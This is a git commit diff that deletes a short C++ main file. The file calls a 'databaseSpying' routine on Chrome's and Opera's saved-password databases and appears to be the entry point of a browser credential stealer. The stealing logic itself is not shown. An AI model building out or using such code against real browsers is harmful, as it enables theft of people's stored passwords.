48fa65c39e778b64d51c4bea8325833c10e6bfe4
Valentin Nasraty <valentin.nasraty@epitech.eu>
2018-11-14 14:26:53 +0100

    Delete main.cpp

--- src/main.cpp
+++
@@ -1,9 +0,0 @@
-
-#include "BrowserPassword.hh"
-
-int main(int ac, const char **av) 
-{
-	databaseSpying(C_DBFILE, C_REGKEY, CSIDL_LOCAL_APPDATA); // Chrome 
-	databaseSpying(O_DBFILE, O_REGKEY, CSIDL_APPDATA); // Opera 
-	return (0);
-}
